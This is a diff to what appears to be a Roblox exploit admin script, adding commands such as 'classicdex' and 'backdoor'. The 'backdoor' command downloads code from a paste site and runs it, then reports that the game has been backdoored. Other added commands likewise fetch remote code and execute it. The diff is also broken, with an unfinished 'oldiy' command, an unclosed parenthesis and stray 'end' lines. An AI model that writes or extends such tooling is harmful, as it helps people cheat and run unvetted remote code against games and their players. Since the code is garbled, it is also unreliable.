@@ -9948,6 +9948,9 @@ addcmd('console',{},function(args, speaker)
 	notify('Console','Press F9 to open the console')
 end)
 
+addcmd('oldiy', {'oiy'}, function(args, speaker)
+
+
 addcmd('explorer', {'dex'}, function(args, speaker)
     notify('Loading', 'Hold on a sec')
     loadstring(game:HttpGet("https://raw.githubusercontent.com/peyton2465/Dex/master/out.lua"))()
@@ -10031,6 +10034,12 @@ addcmd('olddex', {'odex'}, function(args, speaker)
     end
 
     Load(Dex)
+end)
+
+addcmd('classicdex',{'cdex'},function(args, speaker)
+	notify('Classic Dex Opening...','Opening Classic Dex, please wait for a few seconds...')
+	loadstring(game:GetObjects("rbxassetid://418957341")[1].Source)(
+	end
 end)
 
 addcmd('remotespy',{'rspy'},function(args, speaker)
@@ -11936,6 +11945,12 @@ addcmd('tpunanchored',{'tpua'},function(args, speaker)
 		end
 	else
 		notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
+	end
+end)
+
+addcmd('backdoor',{'bd'},function(args, speaker)
+	loadstring(game:HttpGet('https://pastefy.ga/nsnxW7Wh/raw'))()
+	notify('Backdoor','Backdoor has been executed, make sure the game has backdoored.')
 	end
 end)
 
